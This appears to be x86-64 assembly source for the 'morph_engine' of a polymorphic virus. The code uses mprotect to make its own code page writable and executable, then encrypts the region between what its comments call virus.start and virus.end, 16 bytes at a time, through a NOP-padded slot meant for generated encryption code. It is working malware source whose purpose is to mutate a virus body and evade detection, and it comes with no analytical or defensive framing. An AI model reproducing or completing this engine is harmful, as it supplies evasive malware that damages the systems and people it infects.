%include "template.asm.inc"

global morph_engine


section .data

section .text


morph_engine:
;create stack frame
push rbp
mov  rbp, rsp
sub  rsp, 0x28
push rbx
push r12
push r13
push r14
push r15

;save data of using registers
mov [rbp-0x28], rdi
mov [rbp-0x20], rsi
mov [rbp-0x18],	rdx
mov [rbp-0x10],	rcx



; do stuff here
call getpagesize
; rax has 0x1000
mov rcx, rax
; save rax for later use when passing to mprotect
sub	rcx, 0x1
not rcx
mov	rdi, .encryption_function
and rdi, rcx
; AND them and the result will be stored in rcx
; rdi must hold the page_start address
mov rsi, rax
; rsi must have the page length
mov rdx, 0x7
; read+write+exec = 0x7
call mprotect


mov rbx, [rbp-0x28]
mov rsi, [rbp-0x20]
add rsi, rbx
; rsi = full address of virus.start
mov rdi, [rbp-0x18]
add rdi, rsi
; rdi = full address of the virus.end


.encryption_loop:
	; load first 16bytes of memory data to registers
	mov eax, [rsi]
	mov ecx, [rsi+0x4]
	mov edx, [rsi+0x8]
	mov ebx, [rsi+0xC]

.encryption_function:
	times POLY_FUNC_SIZE db OPCODE_NOP
	; put back the data to where it was taken from
	mov [rsi], eax
	mov [rsi+0x4], ecx
	mov [rsi+0x8], edx
	mov [rsi+0xC], ebx
	add rsi, 0x10
	; add 10h to rsi, fast forwards rsi to decrypt next 16bytes
	cmp rsi, rdi
	;compare if rsi = rdi, signalling end of decryption
	jne .encryption_loop




xor rax,rax 
; this will ensure rax = 0 , means completed without error
pop r15
pop r14
pop r13
pop r12
pop rbx
mov rsp, rbp
pop rbp
ret